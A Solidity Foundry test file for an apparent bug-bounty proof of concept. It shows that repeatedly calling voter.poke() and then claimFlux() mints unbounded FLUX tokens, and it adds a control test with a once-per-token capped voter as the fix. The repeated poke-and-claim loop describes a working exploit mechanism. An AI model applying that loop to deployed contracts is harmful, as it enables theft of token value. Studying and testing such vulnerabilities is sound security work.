// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./38110-infinite-minting-of-flux-through-voterpoke-immunefi-alchemix.sol";

contract InfinitePokeMintingTest is Test {
    /// @notice HARM: run() proves 5 poke()+claimFlux() iterations, with nothing
    ///         else happening between them, mint a strictly growing, unbounded
    ///         FLUX balance.
    function test_exploit_balanceGrowsUnboundedEachIteration() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(
            e.flux().balanceOf(address(e)),
            e.CLAIMABLE_PER_CALL() * e.ITERATIONS(),
            "attacker should hold 5x the legitimate one-time accrual after 5 free iterations"
        );
    }

    /// @notice Isolates the exact mechanism: repeated poke() calls with claims
    ///         in between never run out — each call mints more.
    function test_buggyChain_mintsMoreEveryIteration() public {
        VotingEscrow ve = new VotingEscrow();
        FluxToken flux = new FluxToken();
        Voter voter = new Voter(flux);
        flux.setVoter(address(voter));
        flux.setVotingEscrow(address(ve));
        flux.setOwner(1, address(this));
        ve.setClaimable(1, 1 ether);

        for (uint256 i = 0; i < 7; i++) {
            voter.poke(1);
            flux.claimFlux(1, flux.getUnclaimedFlux(1));
        }

        assertEq(flux.balanceOf(address(this)), 7 ether, "7 iterations should mint 7 ether with no cap");
    }

    /// @notice Control: a per-epoch cap (the missing fix) bounds accrual to a
    ///         single claim regardless of how many extra pokes are attempted.
    function test_control_perEpochCapBoundsAccrual() public {
        VotingEscrow ve = new VotingEscrow();
        FluxToken flux = new FluxToken();
        // Reuse the FIXED voter pattern inline: a simple once-only guard.
        CappedVoter voter = new CappedVoter(flux);
        flux.setVoter(address(voter));
        flux.setVotingEscrow(address(ve));
        flux.setOwner(1, address(this));
        ve.setClaimable(1, 1 ether);

        for (uint256 i = 0; i < 5; i++) {
            voter.poke(1);
        }
        flux.claimFlux(1, flux.getUnclaimedFlux(1));

        assertEq(flux.balanceOf(address(this)), 1 ether, "capped voter should bound accrual to a single claim");
    }
}

/// @notice Minimal capped Voter for the control test: accrual can only ever
///         happen once per token, no matter how many times poke() is called.
contract CappedVoter {
    FluxToken public flux;
    mapping(uint256 => bool) public hasAccrued;

    constructor(FluxToken _flux) {
        flux = _flux;
    }

    function poke(uint256 _tokenId) public {
        if (hasAccrued[_tokenId]) return;
        hasAccrued[_tokenId] = true;
        flux.accrueFlux(_tokenId);
    }
}
